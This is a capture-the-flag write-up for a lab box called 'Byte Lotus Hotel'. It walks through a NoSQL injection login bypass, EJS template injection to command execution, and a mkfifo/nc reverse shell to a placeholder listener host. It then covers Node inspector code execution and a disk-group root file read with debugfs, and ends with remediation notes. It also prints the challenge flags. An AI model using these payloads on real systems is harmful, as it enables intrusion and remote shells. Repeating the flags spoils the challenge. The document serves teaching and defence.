# Hacker Holidays — The Byte Lotus Hotel

**Category:** Boot2Root
**Difficulty:** Medium
**Points:** 90
**Target:** `10.114.177.77` (lab IP, rotated during engagement)

## Summary

Byte Lotus is a poolside booking platform built on Express and NeDB. The box
chains four distinct vulnerabilities to go from unauthenticated web access to
root: a NoSQL injection auth bypass, server-side template injection (SSTI) in
an EJS preview feature, an exposed Node.js debugger belonging to a second
service account, and privilege escalation via `disk` group membership.

## Recon

```
nmap -sC -sV -p- -oN nmap_full.txt 10.114.177.77
```

Only two ports open:

| Port | Service | Detail |
|------|---------|--------|
| 22   | ssh     | OpenSSH 9.6p1 Ubuntu |
| 80   | http    | Node.js (Express middleware), "Byte Lotus — Poolside" |

With such a small attack surface, the web app on port 80 was the obvious
entry point.

## Stage 1 — NoSQL injection login bypass

The landing page presents a "Staff / Guest ID" / "Passphrase" login form
posting to `/login`. Directory brute-forcing turned up `/logout` (302),
implying an authenticated area existed even though no cookie was issued to
anonymous visitors.

The backend uses `@seald-io/nedb` (an embedded NoSQL, MongoDB-like store) and
built the query directly from the JSON request body:

```js
let user = await db.findOneAsync({ username, password });
```

Because `password` is taken from the request body without type-checking, a
JSON payload can substitute a MongoDB-style query operator for the expected
string value, causing the datastore to match on a condition instead of an
exact value:

```bash
curl -i -X POST http://10.114.177.77/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attendant","password":{"$ne":""}}'
```

Response:

```
Set-Cookie: connect.sid=s%3ArnHkEC7i_...
{"ok":true,"role":"staff"}
```

`{"$ne":""}` matches any password that is not an empty string — since the
real passphrase is a random 18-byte hex string, it trivially satisfies `$ne`,
authenticating as `attendant` (role: `staff`) without knowing the credential.

**Note:** the session cookie issued by `express-session` expired quickly in
this environment; each exploitation step needed a fresh login/cookie
immediately before use.

## Stage 2 — SSTI in the EJS template preview

The authenticated staff console at `/staff` exposes a "Confirmation
template" feature intended to let staff customize a guest-facing message:

```html
<textarea name="template">Dear <%= guest %>, your Byte Lotus cabana is confirmed.</textarea>
```

The template field is submitted to `/staff/preview` and rendered
server-side with `ejs.render()` on the **entire user-supplied string**,
rather than only substituting a `guest` variable into a fixed template. This
means arbitrary EJS — including embedded JavaScript — is compiled and
executed on the server.

Confirmed with a math expression:

```bash
curl -s -b "$COOKIE" http://10.114.177.77/staff/preview \
  --data-urlencode "template=<%= 7*7 %>"
# -> <pre>49</pre>
```

Since EJS executes inside Node, `process.mainModule.require` reaches Node's
built-in modules, giving command execution:

```bash
curl -s -b "$COOKIE" http://10.114.177.77/staff/preview \
  --data-urlencode "template=<%= process.mainModule.require('child_process').execSync('id').toString() %>"
# -> uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

### Reverse shell

`execSync` blocks until the child process exits, so a naive reverse-shell
pipeline hangs the request indefinitely and can kill the session. Backgrounding
the shell with `setsid ... &` avoids this:

```bash
curl -s -b "$COOKIE" http://10.114.177.77/staff/preview \
  --data-urlencode "template=<%= process.mainModule.require('child_process').execSync('setsid sh -c \"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f\" < /dev/null > /dev/null 2>&1 &').toString() %>"
```

with a listener running locally: `nc -lvnp 4444`.

### User flag

```
$ cat /home/*/user.txt
THM{w4rm_s3ss10n_h1j4ck3d}
```

## Stage 3 — Exposed Node inspector → RCE as `pipelinesvc`

Enumeration from the `poolside` shell found a second listener bound to
loopback only:

```
$ ss -tlnp
LISTEN 0 511 127.0.0.1:9229 0.0.0.0:*
```

Port `9229` is Node's V8 Inspector / debug port. Querying it locally reveals
the debug target:

```bash
curl -s http://127.0.0.1:9229/json
```

```json
[{
  "title": "processor.js",
  "url": "file:///opt/pipelinesvc/telemetry/processor.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/01437416-1446-46f8-b3e0-0dbb49fe63d7"
}]
```

This process (PID 598) runs as `pipelinesvc`. The Node inspector accepts
Chrome DevTools Protocol (CDP) commands over WebSocket, including
`Runtime.evaluate`, which executes arbitrary JavaScript in the target
process — a well-known Node inspector RCE primitive.

A minimal Python CDP client (raw `socket`, hand-rolled WebSocket handshake
and framing, no external deps) was used to send `Runtime.evaluate` calls:

```bash
python3 /tmp/cdp.py "process.mainModule.require('child_process').execSync('id').toString()"
# -> uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

The same technique was used to spawn a second backgrounded reverse shell,
landing an interactive shell as `pipelinesvc`.

## Stage 4 — Privilege escalation via `disk` group

`pipelinesvc`'s group membership included `disk` (gid 6). On Linux, membership
in the `disk` group grants raw read/write access to block devices, which
completely bypasses filesystem permissions — any file on the mounted
filesystem can be read directly from the raw device image.

```
$ lsblk
nvme0n1     20G  disk
└─nvme0n1p1 20G  part /
$ ls -la /dev/nvme0n1p1
brw-rw---- 1 root disk 259, 1 ... /dev/nvme0n1p1
```

`debugfs` (part of `e2fsprogs`, present on the box) can read files directly
out of an ext4 image without mounting it or needing filesystem-level
permission checks:

```bash
debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1
```

### Root flag

```
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

## Attack chain

1. NoSQL injection (`{"$ne":""}`) on `/login` → authenticated as `attendant` (staff role)
2. SSTI in the `/staff/preview` EJS renderer → RCE as `poolside` → **user flag**
3. Discovered `pipelinesvc`'s Node debug inspector exposed on `127.0.0.1:9229` → CDP `Runtime.evaluate` → RCE as `pipelinesvc`
4. `pipelinesvc` in the `disk` group → raw block-device read via `debugfs` → **root flag**

## Root cause / remediation notes

- **NoSQL injection:** never pass request-body values directly into a NeDB/MongoDB query; validate and coerce types (reject non-string `username`/`password`) or use parameterized/whitelisted queries.
- **SSTI:** never call `ejs.render()` (or any template engine's render function) on fully user-controlled input. Use a fixed template with a narrow set of substituted variables, or a logic-less templating format.
- **Exposed debugger:** the Node inspector should never be left listening in production, even on loopback, if other local users/services can reach it. Run with `--inspect` disabled, or restrict it further (auth token, network namespace isolation).
- **Excess group membership:** service accounts should never be members of `disk` (or other groups granting raw device access) unless absolutely required — it is equivalent to root-level filesystem access.

## Flags

| Flag | Value |
|------|-------|
| User | `THM{w4rm_s3ss10n_h1j4ck3d}` |
| Root | `THM{r4w_d1sk_4cc3ss_w4s_t00_much}` |
